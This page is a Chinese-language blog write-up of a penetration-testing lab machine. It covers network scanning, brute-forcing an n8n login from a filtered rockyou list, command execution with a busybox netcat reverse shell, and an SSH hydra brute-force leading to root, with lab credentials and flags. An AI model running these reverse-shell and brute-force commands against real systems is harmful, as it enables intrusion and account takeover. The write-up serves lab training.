@@ -1,0 +1,263 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Labs_NodeCeption_neuro | Blue Star's Blog</title><meta name="author" content="Neuroblue"><meta name="copyright" content="Neuroblue"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="外部打点arp-scan -l 12345678910111213┌──(root㉿kali)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:74:07:c6, IPv4: 192.168.0.9Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;ro">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Labs_NodeCeption_neuro">
+<meta property="og:url" content="https://bluestar-34.github.io/2025/07/24/Labs-NodeCeption-neuro/index.html">
+<meta property="og:site_name" content="Blue Star&#39;s Blog">
+<meta property="og:description" content="外部打点arp-scan -l 12345678910111213┌──(root㉿kali)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:74:07:c6, IPv4: 192.168.0.9Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;ro">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bluestar-34.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-07-24T05:44:28.000Z">
+<meta property="article:modified_time" content="2025-07-24T05:46:20.477Z">
+<meta property="article:author" content="Neuroblue">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Penetration">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bluestar-34.github.io/img/1.jpg"><link rel="shortcut icon" href="/img/B.png"><link rel="canonical" href="https://bluestar-34.github.io/2025/07/24/Labs-NodeCeption-neuro/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Labs_NodeCeption_neuro',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: '20250724_the'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hacker1.jpg);"></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/nav1.jpg" alt="Logo"><span class="site-name">Blue Star's Blog</span></a></span><div id="menus"></div></nav><div id="page-site-info"><h1 id="site-title">Labs_NodeCeption_neuro</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="外部打点"><a href="#外部打点" class="headerlink" title="外部打点"></a>外部打点</h1><p><code>arp-scan -l</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:74:07:c6, IPv4: 192.168.0.9</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1     30:3f:7b:d5:aa:de       Shenzhen YOUHUA Technology Co., Ltd</span><br><span class="line">192.168.0.8     2c:9c:58:8e:96:a5       (Unknown)</span><br><span class="line">192.168.0.12    08:00:27:08:28:cf       PCS Systemtechnik GmbH</span><br><span class="line">192.168.0.4     f2:13:09:db:48:25       (Unknown: locally administered)</span><br><span class="line">192.168.0.2     18:ef:3a:66:33:e3       Sichuan AI-Link Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.425 seconds (105.57 hosts/sec). 5 responded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>前 3 字节（<code>08:00:27</code>）是 **厂商标识（OUI)**，属于 <strong>Oracle VirtualBox</strong>（虚拟机常用）</p>
+<p>PCS Systemtechnik GmbH</p>
+<p>确定目标：192.168.012</p>
+<p>全端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">5678/tcp open  rrac</span><br><span class="line">8765/tcp open  ultraseek-http</span><br><span class="line">MAC Address: 08:00:27:08:28:CF (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<p>很奇怪的两个端口，nc 连接看响应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root㉿kali)-[~]</span><br><span class="line">└─# nc 192.168.0.12 5678</span><br><span class="line">ls                                              </span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc 192.168.0.12 8765  </span><br><span class="line">ls</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Date: Thu, 24 Jul 2025 04:37:36 GMT</span><br><span class="line">Server: Apache/2.4.58 (Ubuntu)</span><br><span class="line">Content-Length: 303</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.58 (Ubuntu) Server at 127.0.1.1 Port 8765&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看到都是 HTTP&#x2F;1.1，即两个 Http 服务，端口是自定义的</p>
+<p>访问 web 服务</p>
+<p>5678 端口开着  n8n 系统 （之前做过，是一个工作流管理系统，可命令执行）</p>
+<p>![[Pasted image 20250724123949.png]]</p>
+<p>这里 email 和 password 不清楚，爆破不了</p>
+<p>8765 是 Apache2 Default Page</p>
+<p>现在只能先做一波信息收集</p>
+<p>在 Apache2 Default Page 里查看源码，找到注释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|   |</span><br><span class="line">|---|</span><br><span class="line">|&lt;!-- usuario@maildelctf.com|</span><br><span class="line">|Espero que hayas cambiado la contraseña como se te indicó.|</span><br><span class="line">|Recuerda: mínimo 8 caracteres, al menos 1 número y 1 mayúscula.|</span><br><span class="line">|--&gt;|</span><br></pre></td></tr></table></figure>
+
+<p><a href="mailto:&#117;&#115;&#x75;&#x61;&#x72;&#105;&#x6f;&#64;&#x6d;&#x61;&#105;&#108;&#x64;&#x65;&#108;&#x63;&#x74;&#x66;&#x2e;&#99;&#x6f;&#109;">&#117;&#115;&#x75;&#x61;&#x72;&#105;&#x6f;&#64;&#x6d;&#x61;&#105;&#108;&#x64;&#x65;&#108;&#x63;&#x74;&#x66;&#x2e;&#99;&#x6f;&#109;</a> 我希望您已按照说明更改密码。请记住：至少 8 个字符，至少 1 个数字和 1 个大写字母。</p>
+<p>得到 mail，这里的 password 需要生成密码字典</p>
+<p>直接从 rockyou.txt 根据规则来筛选，&gt;&#x3D;8个字符，1个数字，1个大写字母</p>
+<p>ai 生成筛选命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -P &#x27;^(?=.*[A-Z])(?=.*[0-9]).&#123;8,&#125;$&#x27; rockyou.txt &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>yakit 爆破密码</p>
+<p>提示 {“message”:”Too many requests”} ，降低线程数，调整随机延迟</p>
+<p>爆破成功，得到账号密码</p>
+<p><a href="mailto:&#x75;&#115;&#x75;&#x61;&#114;&#x69;&#111;&#64;&#x6d;&#x61;&#105;&#x6c;&#100;&#101;&#x6c;&#x63;&#116;&#x66;&#46;&#x63;&#x6f;&#x6d;">&#x75;&#115;&#x75;&#x61;&#114;&#x69;&#111;&#64;&#x6d;&#x61;&#105;&#x6c;&#100;&#101;&#x6c;&#x63;&#116;&#x66;&#46;&#x63;&#x6f;&#x6d;</a>:Password1</p>
+<p>就在 pass.txt 的第一个</p>
+<p>进入后台，创建一个工作流，组件里搜索 command ，创建组件，输入命令</p>
+<p>先测试命令执行的连通性</p>
+<p>![[Pasted image 20250724130259.png]]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping -c 4 192.168.0.9</span><br><span class="line"></span><br><span class="line">tcpdump -A -n icmp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─# tcpdump -A -n icmp</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">13:03:44.370866 IP 192.168.0.12 &gt; 192.168.0.9: ICMP echo request, id 15545, seq 1, length 64</span><br><span class="line">E..T.!@.@..!.......     ....&lt;......h.....O...................... !&quot;#$%&amp;&#x27;()*+,-./01234567</span><br><span class="line">13:03:44.373484 IP 192.168.0.9 &gt; 192.168.0.12: ICMP echo reply, id 15545, seq 1, length 64</span><br><span class="line">E..T.w..@.*.... ........&lt;......h.....O...................... </span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">busybox nc 192.168.0.9:8999 -e /bin/bash</span><br><span class="line"></span><br><span class="line">nc -lvnp 8999</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>调整一下交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm-256color</span><br><span class="line">Ctrl + Z  [background Process]</span><br><span class="line">stty raw -echo ; fg ; reset</span><br><span class="line">stty columns 53 rows 236</span><br></pre></td></tr></table></figure>
+
+<p>拿到 user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">thl@nodeception:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">thl@nodeception:~$ id</span><br><span class="line">uid=1000(thl) gid=1000(thl) groups=1000(thl),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)</span><br><span class="line">thl@nodeception:~$ cat user.txt </span><br><span class="line">THL_wdYkVpXlqNaEUhRJfzbtHm</span><br></pre></td></tr></table></figure>
+
+<p>查看特权命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">thl@nodeception:~$ sudo -l</span><br><span class="line">Matching Defaults entries for thl on nodeception:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User thl may run the following commands on nodeception:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/vi</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
+
+
+<p>但还是要求密码，可能是配置写错了</p>
+<p>这里直接爆破一下用户  thl  的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l thl  -P /root/work/vuln/dic/rockyou.txt  ssh://192.168.0.12 -V -t 64</span><br></pre></td></tr></table></figure>
+
+<p>得到账户密码</p>
+<p>&#96;22][ssh] host: 192.168.0.12   login: thl   password: basketball·</p>
+<p>直接 <code>sudo -i</code> 切换为 root</p>
+<p>提权成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">thl@nodeception:~$ sudo -i</span><br><span class="line">[sudo] password for thl: </span><br><span class="line">root@nodeception:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@nodeception:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@nodeception:~# cat root.txt </span><br><span class="line">THL_QzXeoMuYRcJtWHabnLKfgDi</span><br></pre></td></tr></table></figure>
+<h1 id="渗透测试总结报告"><a href="#渗透测试总结报告" class="headerlink" title="渗透测试总结报告"></a>渗透测试总结报告</h1><h4 id="1-目标信息"><a href="#1-目标信息" class="headerlink" title="1. 目标信息"></a>1. 目标信息</h4><p>• IP地址: 192.168.0.12<br>• MAC地址: 08:00:27:08:28:CF (Oracle VirtualBox虚拟机)<br>• 操作系统: Ubuntu (Apache&#x2F;2.4.58)</p>
+<h4 id="2-攻击路径"><a href="#2-攻击路径" class="headerlink" title="2. 攻击路径"></a>2. 攻击路径</h4><ol>
+<li>信息收集:<br>• 使用<code>arp-scan</code>发现目标IP<br>• 全端口扫描发现开放端口: 22(SSH), 5678(n8n), 8765(Apache)<br>• Apache默认页面源码中发现邮箱和密码策略提示</li>
+<li>Web渗透:<br>• 发现n8n工作流管理系统(5678端口)<br>• 通过源码注释获取邮箱: <code>usuario@maildelctf.com</code><br>• 使用规则过滤<code>rockyou.txt</code>生成密码字典<br>• 爆破获得凭证: <code>usuario@maildelctf.com:Password1</code></li>
+<li>命令执行:<br>• 在n8n中创建包含命令组件的工作流<br>• 验证命令执行成功后建立反弹shell<br>• 获取初始立足点: 用户<code>thl</code></li>
+<li>权限提升:<br>• 发现<code>thl</code>用户可通过SSH登录(密码:<code>basketball</code>)<br>• 利用sudo权限直接提权到root</li>
+</ol>
+<h4 id="3-获取凭证"><a href="#3-获取凭证" class="headerlink" title="3. 获取凭证"></a>3. 获取凭证</h4><p>• Web登录凭证:<br>  • <a href="mailto:&#x75;&#115;&#117;&#x61;&#x72;&#x69;&#111;&#x40;&#x6d;&#97;&#x69;&#108;&#100;&#x65;&#108;&#x63;&#116;&#102;&#x2e;&#99;&#111;&#x6d;">&#x75;&#115;&#117;&#x61;&#x72;&#x69;&#111;&#x40;&#x6d;&#97;&#x69;&#108;&#100;&#x65;&#108;&#x63;&#116;&#102;&#x2e;&#99;&#111;&#x6d;</a>:Password1<br>• SSH凭证:<br>  • thl:basketball</p>
+<h4 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4. 获取flag"></a>4. 获取flag</h4><p>• 用户flag: <code>THL_wdYkVpXlqNaEUhRJfzbtHm</code><br>• root flag: <code>THL_QzXeoMuYRcJtWHabnLKfgDi</code></p>
+<h4 id="5-安全建议"><a href="#5-安全建议" class="headerlink" title="5. 安全建议"></a>5. 安全建议</h4><ol>
+<li>禁用或更改默认&#x2F;弱密码</li>
+<li>限制n8n系统的网络访问</li>
+<li>审查sudo权限配置</li>
+<li>移除网页中的敏感注释信息</li>
+<li>考虑使用防火墙限制非常规端口访问</li>
+</ol>
+<h4 id="6-时间记录"><a href="#6-时间记录" class="headerlink" title="6. 时间记录"></a>6. 时间记录</h4><p>• 测试时间: 2025年7月24日<br>• 总耗时: 约10分钟(从扫描到获取root权限)</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://bluestar-34.github.io">Neuroblue</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://bluestar-34.github.io/2025/07/24/Labs-NodeCeption-neuro/">https://bluestar-34.github.io/2025/07/24/Labs-NodeCeption-neuro/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Penetration/">Penetration</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/15/XYCTF2024%E5%A4%8D%E7%8E%B0/" title="XYCTF2024复现"><img class="cover" src="/img/8.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-15</div><div class="info-item-2">XYCTF2024复现</div></div><div class="info-2"><div class="info-item-1">warm up123456789101112131415161718192021222324252627&lt;?phpinclude &#x27;next.php&#x27;;highlight_file(__FILE__);$XYCTF = &quot;Warm up&quot;;extract($_GET);if (isset($_GET[&#x27;val1&#x27;]) &amp;&amp; isset($_GET[&#x27;val2&#x27;]) &amp;&amp; $_GET[&#x27;val1&#x27;] != $_GET[&#x27;val2&#x27;] &amp;&amp; md5($_GET[&#x27;val1&#x27;]) == md5($_GET[&#x27;val2&#x27;])) &#123;    echo &quot;ez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;    die(&quot;什么情况,这么基础的md5做不来&quot;);&#125;if...</div></div></div></a><a class="pagination-related" href="/2025/07/22/catcat-new%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98-flaskSession-%E4%BC%AA%E9%80%A0%EF%BC%89/" title="catcat-new（文件读取内存 + flaskSession 伪造）"><img class="cover" src="/img/7.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-22</div><div class="info-item-2">catcat-new（文件读取内存 + flaskSession 伪造）</div></div><div class="info-2"><div class="info-item-1">点击猫猫信息看到文件读取功能  环境变量里没有 1http://61.147.171.103:60316/info?file=../../../../proc/self/environ  /proc/self/cmdline，用于获取当前启动进程的完整命令 得到   b’python\x00app.py\x00’ 再次读取上级目录的 ..&#x2F;app.py app是个Flask对象，而secret...</div></div></div></a><a class="pagination-related" href="/2025/07/22/ez-curl%EF%BC%88http-header%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90-exprees-%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%88%AA%E6%96%AD%EF%BC%89/" title="ez_curl（http-header格式解析 + exprees 请求参数截断）"><img class="cover" src="/img/3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-22</div><div class="info-item-2">ez_curl（http-header格式解析 + exprees 请求参数截断）</div></div><div class="info-2"><div class="info-item-1">首先看 js 的 express 框架 12345678910111213app.get(&#x27;/flag&#x27;, (req, res) =&gt; &#123;    if(!req.query.admin.includes(&#x27;false&#x27;) &amp;&amp; req.headers.admin.includes(&#x27;true&#x27;))&#123;        res.send(flag);    &#125;else&#123;        res.send(&#x27;try hard&#x27;);    &#125;&#125;);  必须满足查询参数中不包含 flase，请求头有 admin:true  （这里的请求头是 post 中的请求头） 再看 web php 代码 $input = file_get_contents(&#39;php://input&#39;); 这里是直接获取的 post 内容 $headers = (array)json_decode($input)-&gt;headers; 将一个...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Neuroblue</div><div class="author-info-description">BBBBBBBlue.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bluestar-34/Bluestar-34.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a lonely blue star.</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/24/Labs-NodeCeption-neuro/" title="Labs_NodeCeption_neuro"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Labs_NodeCeption_neuro"/></a><div class="content"><a class="title" href="/2025/07/24/Labs-NodeCeption-neuro/" title="Labs_NodeCeption_neuro">Labs_NodeCeption_neuro</a><time datetime="2025-07-24T05:44:28.000Z" title="Created 2025-07-24 13:44:28">2025-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/22/hexo-%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/" title="hexo 操作指南"><img src="/img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo 操作指南"/></a><div class="content"><a class="title" href="/2025/07/22/hexo-%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/" title="hexo 操作指南">hexo 操作指南</a><time datetime="2025-07-22T07:11:21.000Z" title="Created 2025-07-22 15:11:21">2025-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/22/ez-curl%EF%BC%88http-header%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90-exprees-%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%88%AA%E6%96%AD%EF%BC%89/" title="ez_curl（http-header格式解析 + exprees 请求参数截断）"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ez_curl（http-header格式解析 + exprees 请求参数截断）"/></a><div class="content"><a class="title" href="/2025/07/22/ez-curl%EF%BC%88http-header%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90-exprees-%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%88%AA%E6%96%AD%EF%BC%89/" title="ez_curl（http-header格式解析 + exprees 请求参数截断）">ez_curl（http-header格式解析 + exprees 请求参数截断）</a><time datetime="2025-07-22T07:09:14.000Z" title="Created 2025-07-22 15:09:14">2025-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/22/catcat-new%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98-flaskSession-%E4%BC%AA%E9%80%A0%EF%BC%89/" title="catcat-new（文件读取内存 + flaskSession 伪造）"><img src="/img/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="catcat-new（文件读取内存 + flaskSession 伪造）"/></a><div class="content"><a class="title" href="/2025/07/22/catcat-new%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98-flaskSession-%E4%BC%AA%E9%80%A0%EF%BC%89/" title="catcat-new（文件读取内存 + flaskSession 伪造）">catcat-new（文件读取内存 + 